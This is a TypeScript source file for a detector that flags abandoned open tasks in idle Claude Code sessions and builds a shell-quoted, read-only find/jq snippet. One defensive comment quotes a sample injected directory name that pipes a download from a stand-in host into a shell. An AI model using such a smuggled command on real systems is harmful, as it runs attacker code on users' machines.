/**
 * abandoned-tasks — flags pending/in_progress tasks in a session that has been
 * idle for >= COLD_DAYS (7) days. The cold gate is what prevents a healthy,
 * today-open session from false-positiving.
 *
 * Persona P2 (Priya) / issue #559.
 *
 * dataDeps: reads the optional `tasks` field on RecommendationInput (injected
 * by the main session's wiring in scripts/ingest.mjs + scripts/server.mjs).
 * If the field is absent or empty the detector is silent.
 */
import type { Detector } from '../types';
import type { RecommendationInput } from '../types';
import { newestEpochDate, short } from '../shared';
import type { TaskRecord } from '../../parse-tasks';
import { COLD_DAYS } from '../../parse-tasks';
// `sessionId` is a directory entry name read from `~/.claude/tasks/` — the
// parser does not constrain it to UUID characters — so interpolating it raw
// into a command let a directory called `x; curl evil.sh | sh` run whatever it
// liked the moment the user copied the "fix" (#3230). Always-quote so the
// `find` path stays one inert argument (#3379).
import { shellQuote } from '../../shell-quote';

const MS_PER_DAY = 24 * 60 * 60 * 1000;

export const detector: Detector = {
  id: 'workflow.abandoned-tasks',
  category: 'workflow',
  dataDeps: ['tasks'],

  rule(input: RecommendationInput, now: number) {
    const data = input.tasks ?? [];
    if (!data.length) return null;

    const MS_COLD = COLD_DAYS * MS_PER_DAY;
    const isOpen = (t: TaskRecord) =>
      t.status === 'pending' || t.status === 'in_progress';

    // Group by session; keep only sessions that are cold AND have open tasks.
    const bySession = new Map<string, TaskRecord[]>();
    for (const t of data) {
      const group = bySession.get(t.sessionId) ?? [];
      group.push(t);
      bySession.set(t.sessionId, group);
    }

    interface AbandonedSession {
      sessionId: string;
      daysSinceActive: number;
      count: number;
      subjects: string[];
    }
    const abandoned: AbandonedSession[] = [];

    for (const [sessionId, tasks] of bySession) {
      const openTasks = tasks.filter(isOpen);
      if (!openTasks.length) continue;

      // The session's last-active timestamp = the newest mtime across all its tasks.
      const latestMtime = Math.max(...tasks.map((t) => t.mtimeMs));
      const msIdle = now - latestMtime;
      if (msIdle < MS_COLD) continue; // still warm — not abandoned

      const daysSinceActive = Math.round(msIdle / MS_PER_DAY);
      abandoned.push({
        sessionId,
        daysSinceActive,
        count: openTasks.length,
        subjects: openTasks.map((t) => t.subject),
      });
    }

    if (!abandoned.length) return null;

    // Worst first (most abandoned tasks)
    abandoned.sort((a, b) => b.count - a.count);

    const totalAbandoned = abandoned.reduce((s, a) => s + a.count, 0);
    // Folded over `count` — the field the "worst" claim is about — rather than
    // read off `abandoned[0]`. The sort above is by that same field today, so
    // the two agree; taking the max explicitly means a later re-ranking (by
    // idle days, by session recency) cannot silently turn "worst" into a false
    // superlative, which is the #3459 defect class.
    const top = abandoned.reduce((a, b) => (b.count > a.count ? b : a));
    // Anchored to the newest mtime among the tasks that are actually REPORTED,
    // never to `now` and never to the whole tree. A warm session touched today
    // contributes nothing to the count, the cold-session tally or the evidence
    // rows, so letting it date the finding would make an old abandonment look
    // current — freshness borrowed from data the claim never used. The
    // idle-day figures below are deliberately `now`-relative ("how long since"
    // is a question about the present); the evidence date is not.
    const reportedSessions = new Set(abandoned.map((a) => a.sessionId));
    const asOf = newestEpochDate(
      data.filter((t) => reportedSessions.has(t.sessionId)).map((t) => t.mtimeMs)
    );

    const evidenceLines = abandoned.slice(0, 5).map(
      (a) =>
        `${short(a.sessionId)}: ${a.count} open task(s), ${a.daysSinceActive}d idle`
    );

    // The session directory is passed as ONE separately shell-quoted argument
    // (never spliced into the command text), and `find … -exec jq … {} +` keeps
    // the whole thing a single command with no shell glob to expand (#3230).
    const fixSnippet = abandoned
      .slice(0, 3)
      .map(
        (a) =>
          `find ~/.claude/tasks/${shellQuote(a.sessionId)} -maxdepth 1 -name '*.json' ` +
          `-exec jq 'select(.status!="completed") | .subject' {} +`
      )
      .join('\n');

    return {
      id: 'workflow.abandoned-tasks',
      category: 'workflow',
      severity: 'warning',
      title: 'Abandoned open tasks in cold sessions',
      detail:
        `${totalAbandoned} open task(s) across ${abandoned.length} session(s) ` +
        `idle >= ${COLD_DAYS} days — work that was never PR'd or formally dropped. ` +
        `Worst: ${short(top.sessionId)} with ${top.count} task(s) idle ${top.daysSinceActive}d.`,
      action:
        'Re-open, reassign, or formally close these tasks. ' +
        'Use the fix snippet to inspect what is still open per session.',
      affected: totalAbandoned,
      evidence: evidenceLines,
      fix: {
        target: 'command',
        label: 'Inspect abandoned tasks',
        // Declared, never inherited (an absent fixKind silently defaults to
        // 'validated' — the #3221 failure mode). NOT 'validated', though: this
        // is a POSIX-shell command depending on `jq`, a third-party binary the
        // project never lists as a prerequisite (stated requirements are Claude
        // Code and Node >= 24), and docs/plugin-mirror-README.md advertises
        // "Works on Windows, macOS, and Linux" — on Windows there is no POSIX
        // `find`, no `~` expansion, and no `jq`. That is the textbook 'manual'
        // case: "depends on an external tool or per-environment state; apply by
        // hand where that tool exists". The command is still correct and
        // read-only, and its session id stays shell-quoted (#3230) — it simply
        // is not universally paste-safe, so it must not be offered as one-click.
        fixKind: 'manual',
        note:
          'Run per-session to list tasks never completed, then close or reassign each one. Needs a POSIX shell with `jq` available (on Windows use WSL or Git Bash); adapt the traversal if your environment differs.',
        snippet: fixSnippet,
      },
      provenance: {
        observations: [
          {
            claim: `${totalAbandoned} task(s) are still pending or in_progress across ${abandoned.length} cold session(s)`,
            source: 'parse-tasks (~/.claude/tasks/<session>/*.json)',
            field: 'status',
            value: totalAbandoned,
          },
          {
            claim: `${abandoned.length} session(s) have an open task and no task-file write for at least COLD_DAYS = ${COLD_DAYS} days`,
            source: 'parse-tasks (~/.claude/tasks/<session>/*.json)',
            field: 'mtimeMs',
            value: abandoned.length,
          },
          {
            claim: `the largest open-task backlog is ${top.count} task(s), on session ${short(top.sessionId)}, idle ${top.daysSinceActive} day(s)`,
            source: 'parse-tasks (~/.claude/tasks/<session>/*.json)',
            field: 'status / mtimeMs',
            value: top.count,
          },
          {
            claim: `a session is treated as cold at COLD_DAYS = ${COLD_DAYS} days without a task-file write`,
            source: 'parse-tasks-summary',
            field: 'COLD_DAYS',
            value: COLD_DAYS,
          },
        ],
        // What is measured is FILE MTIME and the recorded `status` string —
        // never whether the work was actually finished elsewhere. A task closed
        // by shipping a PR without editing its JSON still reads as open here,
        // and idle days are measured from the newest mtime in the session, so
        // one touched file keeps a whole session warm. "Never PR'd or formally
        // dropped" in `detail` is the inference drawn from that, not an
        // observation.
        inference:
          'Task-file status and mtime are counted; whether the work was completed ' +
          'outside the task record is not observable here. A stale open status past ' +
          'the cold threshold is read as abandonment.',
        ...(asOf ? { asOf } : {}),
      },
    };
  },
};
